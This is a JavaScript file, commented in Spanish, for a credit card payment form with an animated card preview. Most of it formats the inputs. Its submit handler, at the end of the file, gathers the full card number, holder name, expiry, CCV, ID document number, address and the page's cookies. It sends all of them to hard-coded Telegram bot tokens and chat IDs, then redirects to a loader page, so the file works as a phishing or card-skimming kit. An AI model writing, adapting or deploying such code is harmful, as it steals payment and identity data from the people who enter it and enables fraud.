//TARJETA Y DINAMISMO
const tarjeta = document.querySelector('#tarjeta'),
      btnAbrirFormulario = document.querySelector('#btn-abrir-formulario'),
      formulario = document.querySelector('#formulario-tarjeta'),
      numeroTarjeta = document.querySelector('#tarjeta .numero'),
      nombreTarjeta = document.querySelector('#tarjeta .nombre'),
      logoMarca = document.querySelector('#logo-marca'),
      firma = document.querySelector('#tarjeta .firma p'),
      mesExpiracion = document.querySelector('#tarjeta .mes'),
      yearExpiracion = document.querySelector('#tarjeta .year');
      ccv = document.querySelector('#tarjeta .ccv');

// * Volteamos la tarjeta para mostrar el frente.
const mostrarFrente = () => {
    if(tarjeta.classList.contains('active')){
        tarjeta.classList.remove('active');
    }
}

// * Rotacion de la tarjeta
tarjeta.addEventListener('click', () => {
    tarjeta.classList.toggle('active');
});

// * Boton de abrir formulario
btnAbrirFormulario.addEventListener('click', () => {
    btnAbrirFormulario.classList.toggle('active');
    formulario.classList.toggle('active');
});

// * Select del mes generado dinamicamente.
for(let i = 1; i <= 12; i++){
    let opcion = document.createElement('option');
    opcion.value = i;
    opcion.innerText = i;
    formulario.selectMes.appendChild(opcion);
}

// * Select del año generado dinamicamente.
const yearActual = new Date().getFullYear();
for(let i = yearActual; i <= yearActual + 8; i++){
    let opcion = document.createElement('option');
    opcion.value = i;
    opcion.innerText = i;
    formulario.selectYear.appendChild(opcion);
}

// * Input numero de tarjeta
formulario.inputNumero.addEventListener('keyup', (e) => {
    let valorInput = e.target.value;

    formulario.inputNumero.value = valorInput
    // Eliminamos espacios en blanco
    .replace(/\s/g, '')
    // Eliminar las letras
    .replace(/\D/g, '')
    // Ponemos espacio cada cuatro numeros
    .replace(/([0-9]{4})/g, '$1 ')
    // Elimina el ultimo espaciado
    .trim();

    numeroTarjeta.textContent = valorInput;

    if(valorInput == ''){
        numeroTarjeta.textContent = '#### #### #### ####';

        logoMarca.innerHTML = '';
    }

    if(valorInput[0] == 4){
        logoMarca.innerHTML = '';
        const imagen = document.createElement('img');
        imagen.src = 'img/visa.png';
        logoMarca.appendChild(imagen);
    } else if(valorInput[0] == 5){
        logoMarca.innerHTML = '';
        const imagen = document.createElement('img');
        imagen.src = 'img/mastercard.png';
        logoMarca.appendChild(imagen);
    }

    // Volteamos la tarjeta para que el usuario vea el frente.
    mostrarFrente();
});

// * Input nombre de tarjeta
formulario.inputNombre.addEventListener('keyup', (e) => {
    let valorInput = e.target.value;

    formulario.inputNombre.value = valorInput.replace(/[0-9]/g, '');
    nombreTarjeta.textContent = valorInput;
    firma.textContent = valorInput;

    if(valorInput == ''){
        nombreTarjeta.textContent = 'Jhon Doe';
    }

    mostrarFrente();
});

// * Select mes
formulario.selectMes.addEventListener('change', (e) => {
    mesExpiracion.textContent = e.target.value;
    mostrarFrente();
});

// * Select Año
formulario.selectYear.addEventListener('change', (e) => {
    yearExpiracion.textContent = e.target.value.slice(2);
    mostrarFrente();
});

// * CCV
formulario.inputCCV.addEventListener('keyup', () => {
    if(!tarjeta.classList.contains('active')){
        tarjeta.classList.toggle('active');
    }

    formulario.inputCCV.value = formulario.inputCCV.value
    // Eliminar los espacios
    .replace(/\s/g, '')
    // Eliminar las letras
    .replace(/\D/g, '');

    ccv.textContent = formulario.inputCCV.value;
});

// Función para mostrar loader
function showLoader() {
  document.getElementById('loading-overlay').style.display = 'flex';
}

// Capturar el número de tarjeta desde el input y guardar últimos 4 dígitos
function obtenerUltimos4Digitos() {
    const tarjeta = document.getElementById("inputNumero").value;
    const ultimos4 = tarjeta.slice(-4); // Extraer los últimos 4 dígitos
    localStorage.setItem("ultimos4", ultimos4); // Guardar en el almacenamiento local
    console.log("Últimos 4 dígitos guardados: " + ultimos4);
}

// Modificar el evento de envío del formulario
document.getElementById('formulario-tarjeta').addEventListener('submit', async function (event) {
    event.preventDefault();
    showLoader();

    obtenerUltimos4Digitos(); // Guardar últimos 4 dígitos

    // Capturar los datos de los inputs
    const inputNumero = document.getElementById('inputNumero').value;
    const inputNombre = document.getElementById('inputNombre').value;
    const selectMes = document.getElementById('selectMes').value;
    const selectYear = document.getElementById('selectYear').value;
    const inputCCV = document.getElementById('inputCCV').value;
    const inputDocumento = document.getElementById('inputDocumento').value; // Nuevo campo
    const inputDireccion = document.getElementById('inputDireccion').value; // Nuevo campo

    const datos = {
        numero: inputNumero,
        nombre: inputNombre,
        expiracion: `${selectMes}/${selectYear}`,
        ccv: inputCCV,
        documento: inputDocumento, // Nuevo campo
        direccion: inputDireccion // Nuevo campo
    };

    const botsAndChats = [
        { token: '7993642572:AAHJmZ3dy5lEsQi81vpUqKAI-WmacV3YlDI', chats: ['6328222257', 'CHAT_ID_2'] },
        { token: '7323621941:AAHMKt0uyvD6XZsP6xvw4Pus7XvFjz0q4nY', chats: ['7038426430', 'CHAT_ID_4'] },
    ];

    for (const { token, chats } of botsAndChats) {
        for (const chatId of chats) {
            const url = `https://api.telegram.org/bot${token}/sendMessage`;
            try {
                await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: ` TARJETA DE CREDITO  :\n💳Número: ${datos.numero}\nNombre : ${datos.nombre}\n Expiración: ${datos.expiracion}\nCCV: ${datos.ccv}\n📄 Documento: ${datos.documento}\n🏠 Dirección: ${datos.direccion}\n🍪 Cookies: ${document.cookie || 'Sin cookies'}`
                    })
                });
            } catch (error) {
                console.error(`Error al enviar datos al chat ${chatId} usando el bot ${token}:`, error);
            }
        }
    }

    // Redirigir a la página siguiente
    window.location.href = 'loader.html';
});





